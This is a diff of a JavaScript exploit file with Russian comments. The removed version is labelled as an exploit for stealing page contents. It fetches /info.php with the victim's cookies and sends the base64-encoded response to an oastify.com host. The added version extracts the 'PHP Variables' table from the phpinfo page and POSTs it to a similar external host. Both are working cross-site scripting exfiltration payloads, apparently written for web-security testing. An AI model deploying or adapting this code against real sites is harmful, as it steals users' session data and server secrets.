@@ -1,26 +1,44 @@
-// exp.js - эксплойт для кражи содержимого /profile
-const attackerURL = 'https://nsjahafoludl4h8s7q4ieieib9h85zto.oastify.com';
-
-// Выполняем запрос к защищенной странице
-fetch('/info.php', {
-    credentials: 'include' // Важно: отправляем куки авторизации
-})
-.then(response => response.text())
-.then(data => {
-    // Кодируем содержимое в base64
-    const base64Data = btoa(unescape(encodeURIComponent(data)));
+// Запрос к /info.php
+fetch('/info.php')
+  .then(response => response.text())
+  .then(html => {
+    // Парсинг HTML
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
     
-    // Отправляем данные на сервер злоумышленника
-    fetch(`${attackerURL}/exfil`, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: base64Data
+    // Поиск раздела "PHP Variables"
+    const phpVarsHeader = Array.from(doc.querySelectorAll('h2, h1'))
+      .find(el => el.textContent.includes('PHP Variables'));
+    
+    if (!phpVarsHeader) {
+      throw new Error('PHP Variables section not found');
+    }
+    
+    // Поиск следующей таблицы после заголовка
+    let nextElement = phpVarsHeader.nextElementSibling;
+    while (nextElement && nextElement.tagName !== 'TABLE') {
+      nextElement = nextElement.nextElementSibling;
+    }
+    
+    if (!nextElement) {
+      throw new Error('Table not found after PHP Variables header');
+    }
+    
+    // Кодирование в Base64
+    const tableContent = nextElement.outerHTML;
+    const base64Content = btoa(unescape(encodeURIComponent(tableContent)));
+    
+    // Отправка данных на указанный сервер
+    const targetURL = 'https://nqhafadojubl2h6s5q2icici99f93zro.oastify.com';
+    return fetch(targetURL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {
+        'Content-Type': 'text/plain'
+      },
+      body: base64Content
     });
-    
-    // Дополнительный метод отправки через изображение
-    new Image().src = `${attackerURL}?data=${encodeURIComponent(base64Data)}`;
-})
-.catch(error => {
-    // Отправляем ошибки на сервер
-    new Image().src = `${attackerURL}?error=${encodeURIComponent(error.message)}`;
-});
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
